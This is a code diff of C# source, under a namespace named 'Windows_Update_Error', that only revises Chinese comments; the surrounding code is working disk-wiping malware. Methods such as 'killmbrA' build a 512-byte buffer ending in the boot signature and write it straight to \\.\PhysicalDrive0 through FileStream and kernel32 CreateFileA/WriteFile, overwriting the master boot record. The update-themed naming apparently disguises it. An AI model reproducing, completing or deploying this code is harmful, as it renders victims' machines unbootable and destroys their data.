@@ -14,10 +14,10 @@ namespace Windows_Update_Error
     public class Test
     {
         [DllImport("kernel32.dll", SetLastError = true)]                        //调用Windows API
-        public static extern IntPtr CreateFileA(string lpFileName, uint dwDesiredAccess, uint dwShareMode, uint lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);                    //调用外部命令
+        public static extern IntPtr CreateFileA(string lpFileName, uint dwDesiredAccess, uint dwShareMode, uint lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);                    //声明外部方法
         [DllImport("kernel32.dll", SetLastError = true)]                        //调用Windows API
-        public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToWrite, ref int lpNumberOfBytesWritten, IntPtr lpOverlapped);                                                 //调用外部命令
-        public const int File_Share_Read = 0x00000001;             //部分参数的值
+        public static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, int nNumberOfBytesToWrite, ref int lpNumberOfBytesWritten, IntPtr lpOverlapped);                                                 //声明外部方法
+        public const int File_Share_Read = 0x00000001;             //部分属性的值
         public const int File_Share_Write = 0x00000002;
         public const uint Generic_Read = 0x80000000;
         public const uint Generic_Write = 0x40000000;
@@ -42,9 +42,9 @@ namespace Windows_Update_Error
             mbrdata[510] = 0x55;
             mbrdata[511] = 0xAA;
             string Path = @"\\.\PhysicalDrive0";
-            using (FileStream file = new FileStream(Path, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
+            using (FileStream file = new FileStream(Path, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))         //创建FileStream对象
             {
-                file.Write(mbrdata, 0, 512);
+                file.Write(mbrdata, 0, 512);           //将mbrdata字节块写入文件流
             }
         }
         public int killmbrA()
@@ -60,7 +60,7 @@ namespace Windows_Update_Error
             mbrdata[510] = 0x55;
             mbrdata[511] = 0xAA;
             IntPtr mbr = CreateFileA(@"\\.\PhysicalDrive0", Generic_Read | Generic_Write, File_Share_Read | File_Share_Write, NULL, Open_Existing, NULL, 0);
-            bool x = WriteFile(mbr, mbrdata, 512, ref write, 0);
+            bool x = WriteFile(mbr, mbrdata, 512, ref write, 0);        //将mbrdata字节块中512字节写入mbr
             if (x != false)
             {
                 return 1;
